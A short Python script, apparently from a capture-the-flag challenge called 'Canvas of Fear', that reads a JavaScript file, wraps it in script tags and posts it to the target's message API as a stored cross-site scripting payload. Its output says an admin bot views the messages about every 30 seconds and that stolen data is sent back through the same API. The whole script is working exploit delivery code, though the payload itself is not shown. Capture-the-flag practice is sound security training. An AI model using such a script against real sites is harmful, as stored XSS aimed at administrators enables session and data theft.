#!/usr/bin/env python3
"""Send XSS payload to Canvas of Fear target"""
import requests, sys, time

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://dyn-03.midnightflag.fr:10788"

with open('/home/student/ctfs/midnight_exe/pwn/canvas_of_fear/Canvas_of_fear/xss_payload_final.js') as f:
    js = f.read()

payload = '<script>' + js + '</script>'

print(f"[*] Target: {TARGET}")
print(f"[*] Payload: {len(payload)} bytes")

r = requests.post(f"{TARGET}/api/message", json={"author": "pwner", "content": payload})
print(f"[*] POST /api/message: {r.status_code} {r.json()}")
print("[*] Bot visits /admin/messages every ~30s. Exfil goes to /api/message on target.")
print("[*] Waiting for exploit...")
